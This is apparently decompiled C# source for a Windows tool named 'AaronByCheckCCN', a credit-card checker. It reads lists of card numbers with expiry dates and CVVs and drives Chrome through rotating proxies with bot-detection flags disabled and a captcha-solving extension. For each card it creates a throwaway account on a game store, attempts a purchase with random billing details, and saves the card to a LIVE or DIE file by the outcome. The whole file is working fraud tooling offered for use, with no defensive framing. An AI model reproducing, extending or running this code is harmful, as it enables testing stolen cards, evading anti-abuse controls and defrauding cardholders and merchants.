using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using AaronByCheckCCN.Properties;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;

namespace AaronByCheckCCN
{
    public class Form1 : Form
    {
        
        // Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
        public Form1()
        {
            this.InitializeComponent();
        }

        // Token: 0x06000002 RID: 2 RVA: 0x000020D0 File Offset: 0x000002D0
        public static bool Check_ElementExits(IWebDriver driver, string Xpath)
        {
            return driver.FindElements(By.XPath(Xpath)).Count > 0;
        }

        // Token: 0x06000003 RID: 3 RVA: 0x00002104 File Offset: 0x00000304
        public void ElementAction(IWebDriver driver, string xpath, string action = "CLICK", int index = 0, string text = "", int sleep_time = 1, int waits = 120, int sleep_after = 0)
        {
            int num = 0;
            while (driver.FindElements(By.XPath(xpath)).Count == 0 && num < waits)
            {
                Thread.Sleep(1000 * sleep_time);
                num++;
            }
            bool flag = num == waits;
            if (flag)
            {
                string message = string.Format("Không tìm thấy XPath: {0}", xpath);
                throw new Exception(message);
            }
            bool flag2 = index < 0;
            if (flag2)
            {
                index += driver.FindElements(By.XPath(xpath)).Count;
            }
            bool flag3 = Form1.Check_ElementExits(driver, "//div[@id='onetrust-consent-sdk']");
            if (flag3)
            {
                IWebElement webElement = driver.FindElement(By.XPath("//div[@id='onetrust-consent-sdk']"));
                ((IJavaScriptExecutor)driver).ExecuteScript("arguments[0].remove();", new object[]
                {
                    webElement
                });
            }
            bool flag4 = action.Equals("CLICK");
            if (flag4)
            {
                try
                {
                    driver.FindElements(By.XPath(xpath))[index].Click();
                }
                catch
                {
                    IWebElement webElement2 = driver.FindElements(By.XPath(xpath))[index];
                    IJavaScriptExecutor javaScriptExecutor = (IJavaScriptExecutor)driver;
                    javaScriptExecutor.ExecuteScript("arguments[0].click();", new object[]
                    {
                        webElement2
                    });
                }
            }
            else
            {
                bool flag5 = action.Equals(this.JSCLICK);
                if (flag5)
                {
                    IJavaScriptExecutor javaScriptExecutor2 = (IJavaScriptExecutor)driver;
                    javaScriptExecutor2.ExecuteScript("arguments[0].click();", new object[]
                    {
                        driver.FindElements(By.XPath(xpath))[index]
                    });
                }
                else
                {
                    bool flag6 = action.Equals(this.SEND_KEYS);
                    if (flag6)
                    {
                        driver.FindElements(By.XPath(xpath))[index].SendKeys(text);
                    }
                    else
                    {
                        bool flag7 = action.Equals(this.CLEAR);
                        if (flag7)
                        {
                            driver.FindElements(By.XPath(xpath))[index].Clear();
                        }
                        else
                        {
                            bool flag8 = action.Equals(this.NOTHING);
                            if (flag8)
                            {
                            }
                        }
                    }
                }
            }
            Thread.Sleep(1000 * sleep_after);
        }

        // Token: 0x06000004 RID: 4 RVA: 0x00002314 File Offset: 0x00000514
        public void ActionElement(IWebDriver driver, string xpath, string action = "CLICK", int index = 0, string text = "", int sleep_time = 1, int waits = 120, int sleep_after = 0)
        {
            Actions actions = new Actions(driver);
            int num = 0;
            while (driver.FindElements(By.XPath(xpath)).Count == 0 && num < waits)
            {
                Thread.Sleep(1000 * sleep_time);
                num++;
            }
            bool flag = num == waits;
            if (flag)
            {
                string message = string.Format("Không tìm thấy XPath: {0}", xpath);
                throw new Exception(message);
            }
            bool flag2 = index < 0;
            if (flag2)
            {
                index += driver.FindElements(By.XPath(xpath)).Count;
            }
            bool flag3 = Form1.Check_ElementExits(driver, "//div[@id='onetrust-consent-sdk']");
            if (flag3)
            {
                IWebElement webElement = driver.FindElement(By.XPath("//div[@id='onetrust-consent-sdk']"));
                ((IJavaScriptExecutor)driver).ExecuteScript("arguments[0].remove();", new object[]
                {
                    webElement
                });
            }
            IWebElement toElement = driver.FindElements(By.XPath(xpath))[index];
            bool flag4 = action.Equals("CLICK");
            if (flag4)
            {
                try
                {
                    actions.MoveToElement(toElement).Click().Build().Perform();
                }
                catch
                {
                    IWebElement webElement2 = driver.FindElements(By.XPath(xpath))[index];
                    IJavaScriptExecutor javaScriptExecutor = (IJavaScriptExecutor)driver;
                    javaScriptExecutor.ExecuteScript("arguments[0].click();", new object[]
                    {
                        webElement2
                    });
                }
            }
            else
            {
                bool flag5 = action.Equals(this.JSCLICK);
                if (flag5)
                {
                    IJavaScriptExecutor javaScriptExecutor2 = (IJavaScriptExecutor)driver;
                    javaScriptExecutor2.ExecuteScript("arguments[0].click();", new object[]
                    {
                        driver.FindElements(By.XPath(xpath))[index]
                    });
                }
                else
                {
                    bool flag6 = action.Equals(this.SEND_KEYS);
                    if (flag6)
                    {
                        actions.MoveToElement(toElement).Click().SendKeys(text).Build().Perform();
                    }
                    else
                    {
                        bool flag7 = action.Equals(this.CLEAR);
                        if (flag7)
                        {
                            driver.FindElements(By.XPath(xpath))[index].Clear();
                        }
                        else
                        {
                            bool flag8 = action.Equals(this.NOTHING);
                            if (flag8)
                            {
                            }
                        }
                    }
                }
            }
            Thread.Sleep(1000 * sleep_after);
        }

        // Token: 0x06000005 RID: 5 RVA: 0x00002544 File Offset: 0x00000744
        public static string GetText(IWebDriver Driver, string XPath, int index = 0)
        {
            string result;
            try
            {
                string text = Driver.FindElements(By.XPath(XPath))[index].Text;
                result = text;
            }
            catch
            {
                result = string.Empty;
            }
            return result;
        }

        // Token: 0x06000006 RID: 6 RVA: 0x0000258C File Offset: 0x0000078C
        private void Wait(IWebDriver Driver, string XPATH, int TimeMax = 240, bool isSee = true)
        {
            int num = 0;
            for (; ; )
            {
                Thread.Sleep(1000);
                num++;
                if (isSee)
                {
                    bool flag = Form1.Check_ElementExits(Driver, XPATH);
                    if (flag)
                    {
                        break;
                    }
                }
                else
                {
                    bool flag2 = !Form1.Check_ElementExits(Driver, XPATH);
                    if (flag2)
                    {
                        break;
                    }
                }
                bool flag3 = num > TimeMax;
                if (flag3)
                {
                    goto Block_4;
                }
            }
            return;
        Block_4:
            string message = string.Format("Hết Time Đợi XPath: {0}", XPATH);
            throw new Exception(message);
        }

        // Token: 0x06000007 RID: 7 RVA: 0x00002600 File Offset: 0x00000800
        public static string getBetween(string strSource, string strStart, string strEnd)
        {
            int num = strSource.IndexOf(strStart);
            bool flag = num != -1;
            if (flag)
            {
                num += strStart.Length;
                int num2 = strSource.IndexOf(strEnd, num);
                bool flag2 = num2 > num;
                if (flag2)
                {
                    return strSource.Substring(num, num2 - num);
                }
            }
            return string.Empty;
        }

        // Token: 0x06000008 RID: 8 RVA: 0x00002658 File Offset: 0x00000858
        public void SaveData(string FileName, string NoiDung)
        {
            base.Invoke(new MethodInvoker(delegate ()
            {
                StreamWriter streamWriter = new StreamWriter(FileName, true);
                streamWriter.Write(NoiDung);
                streamWriter.Close();
            }));
        }

        // Token: 0x06000009 RID: 9 RVA: 0x00002690 File Offset: 0x00000890
        private void GhiStatus(int Row, int Cell, string NoiDung)
        {
            base.Invoke(new MethodInvoker(delegate ()
            {
                this.dataGridView1.Rows[Row].Cells[Cell].Value = NoiDung;
            }));
        }

        // Token: 0x0600000A RID: 10 RVA: 0x000026D4 File Offset: 0x000008D4
        public static string RandomString(int length)
        {
            return new string((from s in Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ", length)
                               select s[Form1.random.Next(s.Length)]).ToArray<char>());
        }

        // Token: 0x0600000B RID: 11 RVA: 0x00002720 File Offset: 0x00000920
        public static string Randomint(int length)
        {
            return new string((from s in Enumerable.Repeat<string>("0123456789", length)
                               select s[Form1.random.Next(s.Length)]).ToArray<char>());
        }

        // Token: 0x0600000C RID: 12 RVA: 0x0000276C File Offset: 0x0000096C
        public static string RandomDacBiet(int length)
        {
            return new string((from s in Enumerable.Repeat<string>("!@#$%^&*()", length)
                               select s[Form1.random.Next(s.Length)]).ToArray<char>());
        }

        // Token: 0x0600000D RID: 13 RVA: 0x000027B8 File Offset: 0x000009B8
        private void btn_LoadAcc_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
            if (flag)
            {
                this.txt_LoadAcc.Text = openFileDialog.FileName;
                this.dataGridView1.Rows.Clear();
                string[] array = File.ReadAllLines(this.txt_LoadAcc.Text);
                for (int i = 0; i < array.Length; i++)
                {
                    this.dataGridView1.Rows.Add(new object[]
                    {
                        array[i]
                    });
                }
            }
        }

        // Token: 0x0600000E RID: 14 RVA: 0x00002844 File Offset: 0x00000A44
        private string CheckLive(IWebDriver Driver)
        {
            string result;
            for (; ; )
            {
                try
                {
                    bool flag = Form1.Check_ElementExits(Driver, "//h1[text()='Purchase Successful!']");
                    if (flag)
                    {
                        result = "LIVE";
                        break;
                    }
                    bool flag2 = Form1.Check_ElementExits(Driver, "//h1[text()='Unable to complete your purchase!']");
                    if (flag2)
                    {
                        result = "DIE";
                        break;
                    }
                }
                catch
                {
                }
            }
            return result;
        }

        // Token: 0x0600000F RID: 15 RVA: 0x000028A4 File Offset: 0x00000AA4
        private void BatDau(int ThreadNe)
        {
            for (; ; )
            {
                bool flag = this.IndexRow.Count == 0;
                if (flag)
                {
                    break;
                }
                int num = this.IndexRow.Dequeue();
                IWebDriver webDriver = null;
                for (; ; )
                {
                    try
                    {
                        string text = this.dataGridView1.Rows[num].Cells[0].Value.ToString();
                        string text2 = text.Split(new char[]
                        {
                            '|'
                        })[0];
                        string text3 = text.Split(new char[]
                        {
                            '|'
                        })[1];
                        string text4 = text.Split(new char[]
                        {
                            '|'
                        })[2];
                        string text5 = text.Split(new char[]
                        {
                            '|'
                        })[3];
                        string str = this.txt_Proxy.Lines[this.r.Next(0, this.txt_Proxy.Lines.Length)];
                        ChromeOptions chromeOptions = new ChromeOptions();
                        chromeOptions.BinaryLocation = this.path + "\\Data\\Chrome\\App\\Chrome-bin\\chrome.exe";
                        string str2 = Form1.RandomString(10);
                        chromeOptions.AddArgument("user-data-dir=" + this.path + "\\Profile\\" + str2);
                        chromeOptions.AddArguments(new string[]
                        {
                            "--proxy-server=" + str
                        });
                        string str3 = this.path + "\\Data\\2captcha";
                        chromeOptions.AddArgument("load-extension=" + str3);
                        chromeOptions.AddArgument("--window-size=1000,1000");
                        chromeOptions.AddArgument("--no-sandbox");
                        chromeOptions.AddArgument("--disable-blink-features=AutomationControlled");
                        chromeOptions.AddExcludedArgument("enable-automation");
                        chromeOptions.AddAdditionalChromeOption("useAutomationExtension", false);
                        ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                        webDriver = new ChromeDriver(service, chromeOptions, TimeSpan.FromMinutes(3.0));
                        webDriver.Navigate().GoToUrl("https://trovelive.trionworlds.com/");
                        webDriver.Manage().Timeouts().PageLoad.Add(TimeSpan.FromSeconds(30.0));
                        this.ElementAction(webDriver, "//div[@id='panel']//ul/li[2]", "CLICK", 0, "", 1, 120, 0);
                        string text6 = Form1.RandomString(10) + "@gmail.com";
                        string text7 = Form1.RandomString(3) + Form1.Randomint(3) + Form1.RandomDacBiet(3);
                        this.ElementAction(webDriver, "//input[@type='email']", this.SEND_KEYS, 0, text6.ToLower(), 1, 120, 0);
                        this.ElementAction(webDriver, "//input[@type='password']", this.SEND_KEYS, 0, text7, 1, 120, 0);
                        this.ElementAction(webDriver, "//select[@id='createAccount_age']", this.SEND_KEYS, 0, "33", 1, 120, 0);
                        this.ElementAction(webDriver, "//input[@name='acceptTos']", "CLICK", 0, "", 1, 120, 0);
                        Thread.Sleep(2000);
                        this.Wait(webDriver, "//div[text()='Captcha solved!']", 240, true);
                        this.ElementAction(webDriver, "//button[@id='submit']", "CLICK", 0, "", 1, 120, 0);
                        this.Wait(webDriver, "//a[contains(@href,'logout')]", 240, true);
                        webDriver.Navigate().GoToUrl(this.txt_LinkProduct.Text);
                        webDriver.Manage().Timeouts().PageLoad.Add(TimeSpan.FromSeconds(30.0));
                        this.ElementAction(webDriver, "//aside//button[@type='submit']", "CLICK", 0, "", 1, 120, 0);
                        this.Wait(webDriver, "//iframe[@id='addCCardIFrame']", 240, true);
                        IWebElement frameElement = webDriver.FindElement(By.XPath("//iframe[@id='addCCardIFrame']"));
                        webDriver.SwitchTo().Frame(frameElement);
                        IWebElement frameElement2 = webDriver.FindElement(By.XPath("//iframe"));
                        webDriver.SwitchTo().Frame(frameElement2);
                        string text8 = Form1.RandomString(10);
                        string text9 = Form1.RandomString(10);
                        string text10 = Form1.RandomString(10);
                        string text11 = Form1.RandomString(10);
                        int num2 = this.r.Next(10000, 99999);
                        this.ElementAction(webDriver, "//input[@id='name']", this.SEND_KEYS, 0, text8, 1, 120, 0);
                        this.ElementAction(webDriver, "//input[@id='address']", this.SEND_KEYS, 0, text9, 1, 120, 0);
                        this.ElementAction(webDriver, "//input[@id='city']", this.SEND_KEYS, 0, text10, 1, 120, 0);
                        bool flag2 = Form1.Check_ElementExits(webDriver, "//select[@id='state']");
                        if (flag2)
                        {
                            this.ElementAction(webDriver, "//select[@id='state']", this.SEND_KEYS, 0, text11, 1, 120, 0);
                        }
                        else
                        {
                            this.ElementAction(webDriver, "//input[@id='state']", this.SEND_KEYS, 0, text11, 1, 120, 0);
                        }
                        this.ElementAction(webDriver, "//input[@id='postal_code']", this.SEND_KEYS, 0, num2.ToString(), 1, 120, 0);
                        this.ElementAction(webDriver, "//input[@id='ccNumber']", this.SEND_KEYS, 0, text2, 1, 120, 0);
                        this.ElementAction(webDriver, "//input[@id='CVV2']", this.SEND_KEYS, 0, text5, 1, 120, 0);
                        this.ElementAction(webDriver, "//select[@id='expMonth']", this.SEND_KEYS, 0, text3, 1, 120, 0);
                        this.ElementAction(webDriver, "//select[@id='expYear']", this.SEND_KEYS, 0, text4, 1, 120, 0);
                        this.ElementAction(webDriver, "//button[@id='completeButton']", "CLICK", 0, "", 1, 120, 0);
                        this.Wait(webDriver, "//button[contains(@id,'buyCredits')]", 240, true);
                        this.ElementAction(webDriver, "//div[@class='inset']//input[@type='checkbox']", "CLICK", 0, "", 1, 120, 0);
                        this.ElementAction(webDriver, "//button[contains(@id,'buyCredits')]", "CLICK", 0, "", 1, 120, 0);
                        string a = this.CheckLive(webDriver);
                        bool flag3 = a == "LIVE";
                        if (flag3)
                        {
                            this.GhiStatus(num, 1, "LIVE");
                            this.SaveData("LIVE.txt", "LIVE | " + text + "\r\n");
                        }
                        else
                        {
                            this.GhiStatus(num, 1, "DIE");
                            this.SaveData("DIE.txt", "DIE | " + text + "\r\n");
                        }
                        webDriver.Quit();
                        break;
                    }
                    catch
                    {
                        bool flag4 = webDriver != null;
                        if (flag4)
                        {
                            this.GhiStatus(num, 1, "Error. ReAction");
                            webDriver.Quit();
                        }
                    }
                }
            }
        }

        // Token: 0x06000010 RID: 16 RVA: 0x00002EFC File Offset: 0x000010FC
        private void btn_BatDau_Click(object sender, EventArgs e)
        {
            bool flag = this.txt_LinkProduct.Text == "" || this.txt_Proxy.Text == "";
            if (flag)
            {
                MessageBox.Show("Data Empty");
            }
            else
            {
                for (int i = 0; i < this.dataGridView1.Rows.Count; i++)
                {
                    this.IndexRow.Enqueue(i);
                }
                int num = 0;
                while (num < this.nb_Thread.Value)
                {
                    int ThreadNe = num;
                    Thread thread = new Thread(delegate ()
                    {
                        this.BatDau(ThreadNe);
                    });
                    thread.Start();
                    thread.IsBackground = true;
                    num++;
                }
            }
        }

        // Token: 0x06000011 RID: 17 RVA: 0x00002FE4 File Offset: 0x000011E4
        private void btn_AddCaptcha_Click(object sender, EventArgs e)
        {
            string text = Resources.ConfigCaptcha;
            text = text.Replace("apiKey: null,", "apiKey: \"" + this.txt_Key2Captcha.Text + "\",");
            File.WriteAllText(this.path + "\\Data\\2captcha\\common\\config.js", text);
        }

        // Token: 0x06000012 RID: 18 RVA: 0x00003038 File Offset: 0x00001238
        private void txt_Proxy_TextChanged(object sender, EventArgs e)
        {
            this.label4.Text = this.txt_Proxy.Lines.Length.ToString();
            Settings.Default.sv_Proxy = this.txt_Proxy.Text;
            Settings.Default.Save();
        }

        // Token: 0x06000013 RID: 19 RVA: 0x00003088 File Offset: 0x00001288
        private void Form1_Load(object sender, EventArgs e)
        {
            this.txt_Proxy.Text = Settings.Default.sv_Proxy;
            this.txt_LinkProduct.Text = Settings.Default.sv_LinkProduct;
        }

        // Token: 0x06000014 RID: 20 RVA: 0x000030B7 File Offset: 0x000012B7
        private void txt_LinkProduct_TextChanged(object sender, EventArgs e)
        {
            Settings.Default.sv_LinkProduct = this.txt_LinkProduct.Text;
            Settings.Default.Save();
        }

        // Token: 0x06000015 RID: 21 RVA: 0x000030DC File Offset: 0x000012DC
        protected override void Dispose(bool disposing)
        {
            bool flag = disposing && this.components != null;
            if (flag)
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        public class Settings
        {
            public string sv_LinkProduct { get; set; }

            // ... các thuộc tính và phương thức khác của class Settings
        }

        // Token: 0x04000001 RID: 1
        private const string CLICK = "CLICK";

        // Token: 0x04000002 RID: 2
        private string JSCLICK = "JSCLICK";

        // Token: 0x04000003 RID: 3
        private string SEND_KEYS = "SEND_KEYS";

        // Token: 0x04000004 RID: 4
        private string CLEAR = "CLEAR";

        // Token: 0x04000005 RID: 5
        private string NOTHING = "NOTHING";

        // Token: 0x04000006 RID: 6
        private string path = Application.StartupPath;

        // Token: 0x04000007 RID: 7
        private Random r = new Random();

        // Token: 0x04000008 RID: 8
        private static Random random = new Random();

        // Token: 0x04000009 RID: 9
        private Queue<int> IndexRow = new Queue<int>();

        // Token: 0x0400000A RID: 10
        private int Live = 0;

        // Token: 0x0400000B RID: 11
        private int Die = 0;

        // Token: 0x0400000C RID: 12
        private IContainer components = null;

        // Token: 0x0400000D RID: 13
        private Label label4;

        // Token: 0x0400000E RID: 14
        private Label label3;

        // Token: 0x0400000F RID: 15
        private TextBox txt_Proxy;

        // Token: 0x04000010 RID: 16
        private TextBox txt_LoadAcc;

        // Token: 0x04000011 RID: 17
        private Button btn_LoadAcc;

        // Token: 0x04000012 RID: 18
        private DataGridView dataGridView1;

        // Token: 0x04000013 RID: 19
        private Button btn_BatDau;

        // Token: 0x04000014 RID: 20
        private Label label1;

        // Token: 0x04000015 RID: 21
        private TextBox txt_Key2Captcha;

        // Token: 0x04000016 RID: 22
        private Label label2;

        // Token: 0x04000017 RID: 23
        private TextBox txt_LinkProduct;

        // Token: 0x04000018 RID: 24
        private DataGridViewTextBoxColumn Card;

        // Token: 0x04000019 RID: 25
        private DataGridViewTextBoxColumn Status;

        // Token: 0x0400001A RID: 26
        private NumericUpDown nb_Thread;

        // Token: 0x0400001B RID: 27
        private Label label5;

        // Token: 0x0400001C RID: 28
        private Button btn_AddCaptcha;
    }
}
